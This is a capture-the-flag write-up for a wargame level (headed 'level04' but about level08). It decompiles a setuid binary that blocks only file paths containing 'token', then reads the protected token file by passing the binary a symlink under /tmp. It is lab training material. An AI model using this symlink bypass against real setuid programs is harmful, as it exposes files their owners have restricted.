# level04

## Scanning

**1. Who are we ?**
```sh
$ id
uid=2008(level08) gid=2008(level08) groups=2008(level08),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

## Solution

We found two suspicious file:
- `/home/user/level08/level08` a binary with the setuid flag set.
- `/home/user/level08/token` a file that indicates by its set permissions and name it would contain a sensible token. 

### Privileges

We determined `/home/user/level08/level08` is a prime candidate for privilege escalation because:
- It is owned by `flag08` (our target).
- The group owner is `level08` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level08`, the privilege state is as follows:  
- Real UID: `level08`
- Real GUID: `level08`
- Effective UID: `flag08`
- Effective GUID: `level08`

### Script(s) behaviour(s)

We use [Ghidra](https://github.com/nationalsecurityagency/ghidra) to deassemble and analyze it's content to an equivalent of **C** to understand it's behaviour. We added additionnal comments for additional information.
```c
int main(int argc,char **argv,char **envp)
{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  undefined1 local_414 [1024];
  int local_14;
  
                    /* Unresolved local var: char[1024] buf@[DW_OP_breg4(ESP): +44]
                       Unresolved local var: int fd@[DW_OP_breg4(ESP): +36]
                       Unresolved local var: int rc@[DW_OP_breg4(ESP): +40] */

  local_14 = *(int *)(in_GS_OFFSET + 0x14);

  // 1. Verifies if one extra argument is present.
  if (argc == 1) {
    printf("%s [file to read]\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }

  // 2. Verifies if the first argument contains the substring 'token'. If it does, it exists.
  pcVar1 = strstr(argv[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",argv[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }

  // 3. Opens the file in READ ONLY mode, if possible (enough permissions, etc).
  __fd = open(argv[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",argv[1]);
  }

  // 4. Tries to read maximum 1024 bytes from the file, to prevent buffer overflows of `local_414`.
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }

  // 5. Writes the content of the file to STDOUT.
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(); // 5.1. Verifies if the stack has been corrupted.
  }

  // 6. Returns the number of written bytes.
  return sVar2;
}
```

### Vulnerability

Outside of file permissions, the script only checks for the presence of a substring 'token' in the given file path.
This is a weak security pattern. We could find an alias to the desired file (`/home/user/level08/token`) through a soft or hard file links.

```sh
$ ln -s /home/user/level08/token /tmp/exploit
$ /home/user/level08/level08 /tmp/exploit
```

And there is the flag !
